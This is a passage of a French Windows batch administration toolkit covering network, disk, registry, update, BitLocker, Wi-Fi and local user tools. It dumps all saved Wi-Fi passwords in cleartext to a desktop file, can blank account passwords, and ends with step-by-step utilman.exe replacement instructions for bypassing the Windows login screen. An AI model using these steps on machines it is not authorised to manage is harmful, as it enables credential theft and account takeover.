if not "%customDNS2%"=="" (
    ping -n 1 %customDNS2% >nul
    if errorlevel 1 (
        echo [!] ERREUR: Le DNS secondaire "%customDNS2%" est injoignable.
        echo Il sera ignore.
        set "customDNS2="
        pause
    )
)

cls
echo ===============================================
echo     Application des DNS pour Wi-Fi et Ethernet...
echo ===============================================

netsh interface ip set dns name="Wi-Fi" static %customDNS1% 2>nul
if not "%customDNS2%"=="" netsh interface ip add dns name="Wi-Fi" %customDNS2% index=2 2>nul

netsh interface ip set dns name="Ethernet" static %customDNS1% 2>nul
if not "%customDNS2%"=="" netsh interface ip add dns name="Ethernet" %customDNS2% index=2 2>nul

echo.
echo ===============================================
echo      DNS mis a jour avec succes :
echo        Primaire : %customDNS1%
if not "%customDNS2%"=="" echo        Secondaire : %customDNS2%
echo ===============================================
pause
goto system_tools

:sys_ipconfig
cls
echo Affichage des informations reseau...
ipconfig /all
pause
goto system_tools

:sys_restart_network
cls
echo Redemarrage des cartes reseau...
netsh interface set interface "Wi-Fi" admin=disable 2>nul
netsh interface set interface "Wi-Fi" admin=enable 2>nul
netsh interface set interface "Ethernet" admin=disable 2>nul
netsh interface set interface "Ethernet" admin=enable 2>nul
echo Cartes reseau redemarrees.
pause
goto system_tools

:sys_repair_network
cls
echo ================================
echo     Reparation reseau automatique
echo ================================
echo.
echo Etape 1 : Renouvellement de l'adresse IP...
ipconfig /release >nul
ipconfig /renew >nul

echo Etape 2 : Actualisation des parametres DNS...
ipconfig /flushdns >nul

echo Etape 3 : Reinitialisation des composants reseau...
netsh winsock reset >nul
netsh int ip reset >nul

echo.
echo Les parametres reseau ont ete actualises.
echo Un redemarrage est recommande pour un effet complet.
echo.
set /p restart_net=Souhaitez-vous redemarrer maintenant ? (O/N): 
if /i "%restart_net%"=="O" (
    shutdown /r /t 5
) else (
    pause
    goto system_tools
)

:sys_cleanmgr
cls
echo Lancement du Nettoyage de disque...
cleanmgr
pause
goto system_tools

:sys_chkdsk
cls
echo ===============================================
echo Analyse avancee des erreurs sur tous les lecteurs...
echo ===============================================

for /f "delims=" %%d in ('powershell -NoProfile -Command ^
  "Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Free -ne $null } | ForEach-Object { $_.Name + ':' }" 
') do (
    echo.
    echo Analyse du lecteur %%d ...
    chkdsk %%d /f /r /x
)

echo.
echo Tous les lecteurs ont ete analyses.
pause
goto system_tools

:sys_temp_cleanup
cls

:confirm_cleanup_loop
echo Voulez-vous supprimer les fichiers temporaires et le cache systeme ? (O/N)
set /p confirm_cleanup=Tapez O ou N: 

if /i "%confirm_cleanup%"=="Y" (
    goto delete_temp_files
) else if /i "%confirm_cleanup%"=="YES" (
    goto delete_temp_files
) else if /i "%confirm_cleanup%"=="O" (
    goto delete_temp_files
) else if /i "%confirm_cleanup%"=="N" (
    echo Operation annulee.
    pause
    goto system_tools
) else if /i "%confirm_cleanup%"=="NO" (
    echo Operation annulee.
    pause
    goto system_tools
) else (
    echo Saisie invalide. Veuillez taper O ou N.
    goto confirm_cleanup_loop
)

:delete_temp_files
echo Suppression des fichiers temporaires et du cache systeme...
del /s /f /q %temp%\*.* 2>nul
del /s /f /q C:\Windows\Temp\*.* 2>nul
del /s /f /q "C:\Users\%USERNAME%\AppData\Local\Temp\*.*" 2>nul
echo Fichiers temporaires supprimes.
pause
goto system_tools

:sys_registry_cleanup
cls
echo ======================================================
echo Nettoyage ^& optimisation avances du Registre
echo ======================================================
setlocal enabledelayedexpansion

set backupFolder=%SystemRoot%\Temp\RegistryBackups
if not exist "%backupFolder%" mkdir "%backupFolder%"

set logFile=%SystemRoot%\Temp\RegistryCleanupLog.txt
echo Journal de nettoyage du Registre - %date% %time% > "%logFile%"

set count=0
set safe_count=0

echo Analyse du Registre Windows pour les erreurs et problemes de performance...
for /f "tokens=*" %%A in ('reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall 2^>nul') do (
    set /a count+=1
    set entries[!count!]=%%A
    
    echo %%A | findstr /I "IE40 IE4Data DirectDrawEx DXM_Runtime SchedulingAgent" >nul && (
        set /a safe_count+=1
        set safe_entries[!safe_count!]=%%A
    )
)

if %count%==0 (
    echo Aucune entree superflue trouvee dans le Registre.
    pause
    goto system_tools
)

echo %count% problemes potentiels detectes dans le Registre:
for /L %%i in (1,1,%count%) do echo [%%i] !entries[%%i]!
echo.
echo Sans risque a supprimer (%safe_count% entrees detectees):
for /L %%i in (1,1,%safe_count%) do echo [%%i] !safe_entries[%%i]!
echo.
echo [A] Supprimer uniquement les entrees sures
if %safe_count% GTR 0 echo [B] Revoir les entrees sures avant suppression
echo [C] Creer une sauvegarde du Registre
echo [D] Restaurer une sauvegarde du Registre
echo [E] Verifier les corruptions du Registre
echo [0] Annuler
echo.
set /p reg_choice=Votre choix: 

for %%A in (%reg_choice%) do set reg_choice=%%A
if /i "%reg_choice%"=="0" goto system_tools
if /i "%reg_choice%"=="A" goto delete_safe_reg_entries
if /i "%reg_choice%"=="B" goto review_safe_reg_entries
if /i "%reg_choice%"=="C" goto create_reg_backup
if /i "%reg_choice%"=="D" goto restore_reg_backup
if /i "%reg_choice%"=="E" goto scan_registry
if "%reg_choice%"=="" goto system_tools

echo Saisie invalide, retour au menu.
pause
goto system_tools

:delete_safe_reg_entries
if %safe_count%==0 (
    echo Aucune entree sure a supprimer.
    pause
    goto system_tools
)
echo Suppression de toutes les entrees sures detectees...
for /L %%i in (1,1,%safe_count%) do (
    echo Suppression de !safe_entries[%%i]!...
    reg delete "!safe_entries[%%i]!" /f
    echo Supprime: !safe_entries[%%i]! >> "%logFile%"
)
echo Suppression terminee.
pause
goto system_tools

:review_safe_reg_entries
cls
echo Entrees du Registre sures a supprimer:
for /L %%i in (1,1,%safe_count%) do echo [%%i] !safe_entries[%%i]!
echo.
echo Voulez-vous toutes les supprimer ? (O/N)
set /p confirm_reg=
for %%A in (%confirm_reg%) do set confirm_reg=%%A
if /i "%confirm_reg%"=="Y" goto delete_safe_reg_entries
if /i "%confirm_reg%"=="O" goto delete_safe_reg_entries
echo Operation annulee.
pause
goto system_tools

:create_reg_backup
set backupName=RegistryBackup_%date:~-4,4%-%date:~-7,2%-%date:~-10,2%_%time:~0,2%-%time:~3,2%.reg
echo Creation de la sauvegarde: %backupFolder%\%backupName%...
reg export HKLM "%backupFolder%\%backupName%" /y
echo Sauvegarde creee avec succes.
pause
goto system_tools

:restore_reg_backup
echo Sauvegardes disponibles:
dir /b "%backupFolder%\*.reg"
echo Entrez le nom de la sauvegarde a restaurer:
set /p backupFile=
if exist "%backupFolder%\%backupFile%" (
    echo Restauration en cours...
    reg import "%backupFolder%\%backupFile%"
    echo Restauration effectuee avec succes.
) else (
    echo Fichier de sauvegarde introuvable. Verifiez le nom et reessayez.
)
pause
goto system_tools

:scan_registry
cls
echo Verification des corruptions du Registre...
sfc /scannow
dism /online /cleanup-image /checkhealth
echo Verification terminee. Si des erreurs ont ete trouvees, redemarrez votre PC.
pause
goto system_tools

:sys_drivers
cls
echo Enregistrement de la liste des pilotes sur le Bureau...
driverquery /v > "%USERPROFILE%\Desktop\Pilotes_installes.txt"
echo.
echo Le rapport des pilotes a ete enregistre ici :
echo %USERPROFILE%\Desktop\Pilotes_installes.txt
pause
goto system_tools

:sys_report
cls
echo Generation de rapports systeme separes...
echo.

for /f "usebackq delims=" %%d in (`powershell -NoProfile -Command "$env:USERPROFILE + '\Desktop'"`) do (
    set "DESKTOP=%%d"
)

for /f "usebackq delims=" %%t in (`powershell -NoProfile -Command "Get-Date -Format yyyy-MM-dd"`) do (
    set "DATESTR=%%t"
)

set "SYS=%DESKTOP%\Infos_Systeme_%DATESTR%.txt"
set "NET=%DESKTOP%\Infos_Reseau_%DATESTR%.txt"
set "DRV=%DESKTOP%\Liste_Pilotes_%DATESTR%.txt"

echo Ecriture des informations systeme...
systeminfo > "%SYS%" 2>nul

echo Ecriture des informations reseau...
ipconfig /all > "%NET%" 2>nul

echo Ecriture de la liste des pilotes...
driverquery > "%DRV%" 2>nul

echo.
echo Rapports enregistres sur le Bureau.
pause
goto system_tools

:sys_reset_windows_update
cls
echo ======================================================
echo            Utilitaire Windows Update ^& Reset Services
echo ======================================================
echo Cet outil va redemarrer les services Windows Update principaux.
echo Assurez-vous qu'aucune mise a jour n'est en cours d'installation.
pause

echo.
echo [1] Reinitialiser les services (wuauserv, cryptsvc, appidsvc, bits)
echo [0] Retour au menu
echo.
set /p fixchoice=Choisissez une option: 

if "%fixchoice%"=="1" goto reset_wu_services
if "%fixchoice%"=="2" goto system_tools
if "%fixchoice%"=="0" goto system_tools

echo Saisie invalide. Reessayez.
pause
goto sys_reset_windows_update

:reset_wu_services
cls
echo ======================================================
echo     Redemarrage des services Windows Update
echo ======================================================

echo Arret du service Windows Update...
net stop wuauserv >nul

echo Arret du service de Chiffrement...
net stop cryptsvc >nul

echo Demarrage du service Application Identity...
net start appidsvc >nul

echo Demarrage du service Windows Update...
net start wuauserv >nul

echo Demarrage du service BITS...
net start bits >nul

echo.
echo [OK] Services lies aux mises a jour redemarres.
pause
goto system_tools

::sys_support
cls
echo Fonction en cours de developpement...
pause
goto system_tools

:sys_windows_update
cls
echo ===============================================
echo      Outil de reparation Windows Update
echo ===============================================
echo.
echo [1/4] Arret des services lies aux mises a jour...

call :stopIfExists wuauserv
call :stopIfExists bits
call :stopIfExists cryptsvc
call :stopIfExists msiserver
timeout /t 2 >nul

echo [2/4] Renommage des dossiers de cache...
set "SUFFIX=.bak_%RANDOM%"
if exist "%windir%\SoftwareDistribution" (
    ren "%windir%\SoftwareDistribution" "SoftwareDistribution%SUFFIX%" 2>nul
)
if exist "%windir%\System32\catroot2" (
    ren "%windir%\System32\catroot2" "catroot2%SUFFIX%" 2>nul
)

echo [3/4] Redemarrage des services...
call :startIfExists wuauserv
call :startIfExists bits
call :startIfExists cryptsvc
call :startIfExists msiserver

echo.
echo [4/4] Les composants de Windows Update ont ete reinitialises.
pause
goto system_tools

:stopIfExists
sc query "%~1" | findstr /i "STATE" >nul
if not errorlevel 1 (
    net stop "%~1" >nul 2>&1
)
goto :eof

:startIfExists
sc query "%~1" | findstr /i "STATE" >nul
if not errorlevel 1 (
    net start "%~1" >nul 2>&1
)
goto :eof

:sys_bitlocker_check
cls
echo ===============================================
echo     Verification chiffrement BitLocker / Dechiffrage
echo ===============================================
echo.
set /p drive_letter=Lettre du lecteur a verifier (ex: C): 
if "%drive_letter%"=="" set drive_letter=C

rem Normaliser en ajoutant deux-points si absent
set "dl=%drive_letter%"
if not "%dl:~-1%"==":" set "dl=%dl%:"

cls
echo Verification du statut BitLocker pour %dl% ...
manage-bde -status %dl%

for /f "tokens=2 delims{:} " %%A in ('manage-bde -status %dl% ^| findstr /I "Conversion Status   Percentage Encrypted   Protection Status   Verrouille   Locked   Protection"') do set bl_state=%%A

rem Detection simple via findstr si le volume est non chiffre
manage-bde -status %dl% | findstr /I "Percentage Encrypted: 0%" >nul 2>&1
if %errorlevel%==0 (
    echo.
    echo Ce lecteur ne semble pas chiffre. Aucune action necessaire.
    pause
    goto system_tools
)

echo.
set /p confirm_dec=Le lecteur est chiffre. Voulez-vous lancer le dechiffrement maintenant ? (O/N): 
if /i "%confirm_dec%"=="O" (
    echo Lancement du dechiffrement de %dl% ...
    manage-bde -off %dl%
    echo Commande envoyee. Le processus peut prendre du temps.
    pause
    goto system_tools
) else (
    echo Operation annulee.
    pause
    goto system_tools
)

:sys_wifi_passwords
cls
REM Elevation en administrateur si necessaire pour operations Wi-Fi
net session >nul 2>&1
if %errorlevel% neq 0 (
	powershell -Command "Start-Process '%~f0' -Verb RunAs"
	exit /b
)
color 0A
echo ===============================================
echo   Mots de passe Wi-Fi - Afficher/Supprimer/Reporter
echo ===============================================

echo.
setlocal enabledelayedexpansion
set "OUTPUT=%USERPROFILE%\Desktop\Wifi_Mots_de_passe.txt"
set "MAPFILE=%TEMP%\wifi_map_%RANDOM%.txt"

:menu_wifi
call :wifi_collect
set "opts=Afficher les mots de passe Wi-Fi;Supprimer un reseau Wi-Fi;Generer un rapport sur le Bureau"
call :DynamicMenu "MOTS DE PASSE WI-FI" "%opts%"
set "wchoice=%errorlevel%"

if "%wchoice%"=="1" goto wifi_view
if "%wchoice%"=="2" goto wifi_display
if "%wchoice%"=="3" goto wifi_report
if "%wchoice%"=="0" goto wifi_exit
goto menu_wifi

:wifi_view
call :wifi_collect
cls
echo ==============================================================
echo             LISTE DES RESEAUX WI-FI ENREGISTRES
echo ==============================================================
echo.
if %found%==0 (
    echo Aucun profil Wi-Fi trouve.
    pause
    goto menu_wifi
)
for /f "tokens=1,2 delims=|" %%A in ('type "%MAPFILE%"') do (
    echo SSID: %%A 
    echo MDP : %%B
    echo ------------------------------------------
)
echo.
pause
goto menu_wifi

:wifi_collect
if exist "%MAPFILE%" del "%MAPFILE%" >nul 2>&1
set found=0
for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /R /I /C:"All User Profile" /C:"Profil"') do (
	set "ssid=%%I"
	set "ssid=!ssid:~1!"
	if not "!ssid!"=="" (
		set "pwd="
		for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /I /R /C:"Key Content" /C:"Contenu de la cl"') do (
			set "pwd=%%K"
		)
		set "pwd=!pwd:~1!"
		if "!pwd!"=="" set "pwd=(Aucun)"
		>>"%MAPFILE%" echo !ssid!^|!pwd!
		set found=1
	)
)
exit /b 0

:wifi_display
call :wifi_collect
if %found%==0 (
    echo Aucun profil Wi-Fi trouve.
    pause
    goto menu_wifi
)

set "wifi_opts="
for /f "tokens=1,2 delims=|" %%A in ('type "%MAPFILE%"') do (
    if defined wifi_opts (set "wifi_opts=!wifi_opts!;SSID: %%A | MDP: %%B") else (set "wifi_opts=SSID: %%A | MDP: %%B")
)

call :DynamicMenu "SUPPRIMER UN RESEAU WI-FI" "%wifi_opts%"
set "wifi_res=%errorlevel%"
if "%wifi_res%"=="0" goto menu_wifi

rem Recuperer le SSID selectionne
set /a idx=0
set "TARGET="
for /f "tokens=1,2 delims=|" %%A in ('type "%MAPFILE%"') do (
    set /a idx+=1
    if !idx! equ %wifi_res% set "TARGET=%%A"
)

if not defined TARGET goto menu_wifi

echo.
echo Suppression du profil: "%TARGET%" ...
netsh wlan delete profile name="%TARGET%"
pause
goto menu_wifi


:wifi_report
call :wifi_collect
cls
if %found%==0 (
	echo Aucun profil Wi-Fi trouve. Rapport non cree.
	pause
	goto menu_wifi
)
for /f %%C in ('find /v /c "" ^< "%MAPFILE%"') do set count=%%C
echo Total d'identifiants recuperes: %count%
>"%OUTPUT%" echo Mots de passe Wi-Fi exportes - %date% %time%
>>"%OUTPUT%" echo ===============================================
>>"%OUTPUT%" echo Total: %count%
for /f "tokens=1,2 delims=|" %%A in ('type "%MAPFILE%"') do (
	>>"%OUTPUT%" echo SSID: %%A ^| MDP: %%B
)
echo Rapport enregistre: "%OUTPUT%"
pause
goto menu_wifi

:wifi_exit
if exist "%MAPFILE%" del "%MAPFILE%" >nul 2>&1
endlocal
goto system_tools

REM ================= Embedded: Gestion des utilisateurs locaux (um_*) =================
:um_menu
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
for /f "usebackq tokens=*" %%G in (`powershell -NoProfile -Command "$n=([System.Security.Principal.SecurityIdentifier]::new('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value.Split('\\')[-1]; Write-Output $n"`) do set "UM_ADMIN_GROUP=%%G"
if not defined UM_ADMIN_GROUP set "UM_ADMIN_GROUP=Administrators"
net localgroup "%UM_ADMIN_GROUP%" >nul 2>&1 || set "UM_ADMIN_GROUP=Administrateurs"
set "UM_STR_PWD_REQ_EN=Password required"
set "UM_STR_PWD_REQ_FR=Mot de passe requis"

set "opts=Lister les utilisateurs;Ajouter un utilisateur;Supprimer un utilisateur;Ajouter/retirer un administrateur;Ajouter/Modifier un mot de passe;Supprimer le mot de passe (Auto-login)"
call :DynamicMenu "GESTION UTILISATEURS LOCAUX" "%opts%"
set "um_choice=%errorlevel%"

if "%um_choice%"=="1" goto um_list
if "%um_choice%"=="2" goto um_add
if "%um_choice%"=="3" goto um_del
if "%um_choice%"=="4" goto um_admin
if "%um_choice%"=="5" goto um_reset
if "%um_choice%"=="6" goto um_remove_pwd
if "%um_choice%"=="0" goto um_exit
goto um_menu

:um_list
cls
echo Utilisateur           Admin   Actif   MDPDefini
echo ------------------------------------------------
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $adminGroups=@('Administrators','Administrateurs'); $admins=@(); foreach($g in $adminGroups){ try{ $admins+=$(Get-LocalGroupMember -Group $g -ErrorAction Stop | ForEach-Object { $_.Name.Split('\\')[-1] }) } catch{} }; $admins = $admins | Sort-Object -Unique; Get-LocalUser | Where-Object Enabled | Sort-Object Name | ForEach-Object { $u=$_; $has=$false; try { $pls = $u | Select-Object -ExpandProperty PasswordLastSet -ErrorAction Stop; if ($pls) { $has=$true } } catch {}; if (-not $has) { try { $nu = net user \"$($u.Name)\" 2>$null; $line = $nu | Where-Object { $_ -match '^(Password last set|Dernier changement du mot de passe)\s+' }; if ($line) { $val = ($line -split '\\s{2,}',2)[1].Trim(); if ($val -and $val -notmatch '^(Never|Jamais)$') { $has=$true } } } catch {} }; if (-not $has -and $u.PasswordRequired) { $has=$true }; [PSCustomObject]@{ Utilisateur=$u.Name; Admin= if($admins -contains $u.Name){'Oui'}else{'Non'}; Actif= if($u.Enabled){'Oui'}else{'Non'}; MDPDefini= if($has){'Oui'}else{'Non'} } } | Format-Table -AutoSize -HideTableHeaders" || echo Erreur lors de la liste
echo.
pause
goto um_menu

:um_admin
cls
set "user_opts="
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "AJOUT/RETRAIT DROITS ADMIN" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

rem Recuperer le nom de l'utilisateur
set /a idx=1
set "UADM="
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if !idx! equ %res% set "UADM=%%U"
    set /a idx+=1
)

if not defined UADM goto um_menu

set "opts=Ajouter aux Administrateurs;Retirer des Administrateurs"
call :DynamicMenu "ACTION POUR !UADM!" "%opts%"
set "OP=%errorlevel%"

if "%OP%"=="1" (
    net localgroup "%UM_ADMIN_GROUP%" "%UADM%" /add
    if !errorlevel!==0 (echo '%UADM%' a ete ajoute aux Administrateurs.) else (echo Echec.)
) else if "%OP%"=="2" (
    net localgroup "%UM_ADMIN_GROUP%" "%UADM%" /delete
    if !errorlevel!==0 (echo '%UADM%' a ete retire des Administrateurs.) else (echo Echec.)
)
pause
goto um_menu


:um_add
cls
call :um_show_active
set /p NEWU=Nom d'utilisateur a ajouter ^> 
if "%NEWU%"=="" goto um_menu
set /p SETPWD=Affecter un mot de passe maintenant ? ^(O/N^) ^> 
if /I "%SETPWD%"=="O" (
    set /p NEWP=Mot de passe ^> 
    net user "%NEWU%" "%NEWP%" /add /y
) else (
    net user "%NEWU%" "" /add /y
)
if not %errorlevel%==0 (
    echo Echec de creation de l'utilisateur.
    pause
    goto um_menu
)
set /p ADDADM=Ajouter '%NEWU%' aux Administrateurs ? ^(O/N^) ^> 
if /I "%ADDADM%"=="O" net localgroup "%UM_ADMIN_GROUP%" "%NEWU%" /add
echo Utilisateur cree.
pause
goto um_menu

:um_del
cls
set "user_opts="
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "SUPPRIMER UN UTILISATEUR" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set /a idx=1
set "DELU="
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if !idx! equ %res% set "DELU=%%U"
    set /a idx+=1
)

if not defined DELU goto um_menu

cls
echo.
echo ATTENTION: Vous allez supprimer l'utilisateur '%DELU%'
echo.
set /p CONF=Confirmer la suppression ? (Tapez OUI pour valider) > 
if /I not "%CONF%"=="OUI" goto um_menu

net localgroup "%UM_ADMIN_GROUP%" "%DELU%" /delete >nul 2>nul
net user "%DELU%" /delete
if %errorlevel%==0 (echo Utilisateur supprime.) else (echo Echec de suppression.)
pause
goto um_menu


:um_reset
cls
set "user_opts="
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "AJOUTER/MODIFIER LE MOT DE PASSE" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set /a idx=1
set "RUSER="
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if !idx! equ %res% set "RUSER=%%U"
    set /a idx+=1
)

if not defined RUSER goto um_menu

echo.
set /p RNEWP=Nouveau mot de passe ^> 
set /p RNEWP2=Confirmez le mot de passe ^> 
if not "%RNEWP%"=="%RNEWP2%" (
    echo Les mots de passe ne correspondent pas.
    pause
    goto um_menu
)
net user "%RUSER%" "%RNEWP%"
if not %errorlevel%==0 (
    echo Echec de la mise a jour du mot de passe.
    pause
    goto um_menu
)

echo Mot de passe mis a jour.
set /p RFORCE=Exiger le changement au prochain logon ? (O/N) ^> 
if /I not "%RFORCE%"=="O" goto um_reset_end

powershell -NoProfile -ExecutionPolicy Bypass -Command "$u=[ADSI]('WinNT://' + $env:COMPUTERNAME + '/%RUSER%,user'); $u.PasswordExpired=1; $u.SetInfo()"
echo Obligation de changement au prochain logon active.

:um_reset_end
pause
goto um_menu

:um_remove_pwd
cls
set "user_opts="
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "SUPPRIMER MDP (AUTO-LOGIN)" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set /a idx=1
set "RUSER="
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if !idx! equ %res% set "RUSER=%%U"
    set /a idx+=1
)

if not defined RUSER goto um_menu

echo.
echo ======================================================
echo ATTENTION : Vous allez supprimer le mot de passe de '%RUSER%' !
echo Cela permettra a toute personne d'y acceder sans mot de passe a l'allumage.
echo.
set /p RCONFIRM=Voulez-vous vraiment continuer ? (O/N) ^> 
if /I not "%RCONFIRM%"=="O" (
    echo [X] Operation annulee.
    pause
    goto um_menu
)

net user "%RUSER%" "" >nul 2>&1
if %errorlevel%==0 (
    echo [OK] Mot de passe de l'utilisateur '%RUSER%' supprime avec succes.
) else (
    echo [ECHEC] Impossible de supprimer le mot de passe de '%RUSER%'.
)
pause
goto um_menu


:um_show_active
echo.
echo Utilisateurs actifs:
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-LocalUser | Where-Object Enabled | Sort-Object Name | Select-Object -ExpandProperty Name | ForEach-Object { $_ }" 2>nul
echo.
goto :eof

:um_exit
endlocal
goto system_tools
REM ================= End Embedded: Gestion des utilisateurs locaux =================

REM ===================================================================
REM                    SORTIE DU SCRIPT
REM ===================================================================
:exit_script
cls
echo ======================================================
echo     MERCI D'AVOIR UTILISE CET OUTIL !
echo ======================================================
echo.
echo Developpe par ALEEXLEDEV
echo.
echo Appuyez sur une touche pour quitter...
pause >nul
exit

:DynamicMenu
:: Arguments: %1="Titre", %2="Option1;Option2;Option3"
:: Retourne: ERRORLEVEL (1, 2, 3...) ou 0 pour Echap/Retour
setlocal
set "m_title=%~1"
set "m_opts=%~2"

rem Script PowerShell aéré pour un look plus premium avec descriptions
set "ps_code=$o='%m_opts%'-split';';$t='%m_title%';$sel=@();for($i=0;$i -lt $o.Count;$i++){if($o[$i] -notmatch '^\[---'){$sel+=$i}};$sIdx=0;clear-host;while($true){[console]::SetCursorPosition(0,0);write-host '                                                                      ';write-host '  ======================================================' -f Cyan;write-host ('   ' + $t) -f White;write-host '  ======================================================' -f Cyan;write-host '                                                                      ';$num=1;for($i=0;$i -lt $o.Count;$i++){$parts=$o[$i]-split'~';$s=$parts[0];$d='';if($parts.Count -gt 1){$d=$parts[1]};if($s -match '^\[---'){if($i -gt 0){write-host '                                                                      '};write-host ('       ' + $s.PadRight(80)) -f Cyan}else{if($i -eq $sel[$sIdx]){$cY=[console]::CursorTop;write-host ('    >> [{0}] {1}  ' -f $num, $s) -NoNewline -f Black -b White;if($d){write-host ('   - ' + $d).PadRight(120) -f Yellow}else{write-host '                                                                                                                           '}}else{write-host ('       [{0}] {1}  ' -f $num, $s).PadRight(120) -f Gray};$num++}};write-host '                                                                      ';write-host '  ------------------------------------------------------' -f Cyan;write-host '   [FLECHES] Naviguer | [ENTREE] Valider | [0/ECHAP] Retour                                       ' -f DarkGray;write-host '                                                                      ';try{[console]::WindowTop=[math]::Max(0,$cY-10)}catch{};$k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');$v=$k.VirtualKeyCode;if($v -eq 38){$sIdx--;if($sIdx -lt 0){$sIdx=$sel.Count-1}}elseif($v -eq 40){$sIdx++;if($sIdx -ge $sel.Count){$sIdx=0}}elseif($v -eq 13){clear-host;exit ($sIdx+1)}elseif($v -eq 27 -or $k.Character -eq '0'){clear-host;exit 0}elseif([string]$k.Character -match '^[1-9]$' -and [int][string]$k.Character -le $sel.Count){clear-host;exit ([int][string]$k.Character)}}"

powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_code%"
set "res=%errorlevel%"
exit /b %res%


:sys_unlock_notes
cls
echo ===============================================
echo   NOTE: Debloquer une session Windows (WinRE)
echo ===============================================
echo.
echo 1^) Demarrer sur une cle USB Windows ^(WinRE/WinPE^) puis ouvrir l'invite de commande.
echo.
echo 2^) Identifier la lettre du disque contenant Windows:
echo    ^> diskpart
echo    ^> list volume
echo    Reperer le volume ou se trouve le dossier \Windows ^(ex: Z:^)
echo.
echo    S'il n'y en a pas ^(pas de lettre sur le volume Windows^):
echo    ^> select volume X
echo    ^> assign letter=Z
echo    ^> exit
echo.
echo 3^) Verifier la presence des fichiers cibles:
echo    ^> dir Z:\windows\system32\cmd.exe
echo    ^> dir Z:\windows\system32\utilman.exe
echo.
echo 4^) Remplacer utilman.exe par cmd.exe ^(sauvegarder si besoin avant^):
echo    ^(Optionnel^) Sauvegarde:
echo    ^> copy Z:\windows\system32\utilman.exe Z:\windows\system32\utilman.exe.bak
echo    Remplacement:
echo    ^> copy Z:\windows\system32\cmd.exe Z:\windows\system32\utilman.exe
echo    Tapez O ^(Oui^) si demande pour remplacer.
echo.
echo 5^) Redemarrer le PC normalement.
echo.
echo 6^) A l'ecran de connexion, cliquer sur le bouton "Ergonomie" ^(facilites d'acces^):
echo    Une fenetre CMD s'ouvre avec privileges systeme.
echo.
echo 7^) Changer le mot de passe du compte desire:
echo    ^> net user nom_utilisateur nouveau_motdepasse
echo    Exemple:
echo    ^> net user martin 123456
echo.
echo 8^) ^(Recommande^) Restaurer utilman.exe d'origine apres recuperation:
echo    ^> copy Z:\windows\system32\utilman.exe.bak Z:\windows\system32\utilman.exe
echo.
echo 9^) Securite:
echo    - N'effectuer ces operations que si vous etes autorise.
echo    - Supprimer la sauvegarde .bak et activer des protections ^(BitLocker, etc.^).
echo.
pause
goto system_tools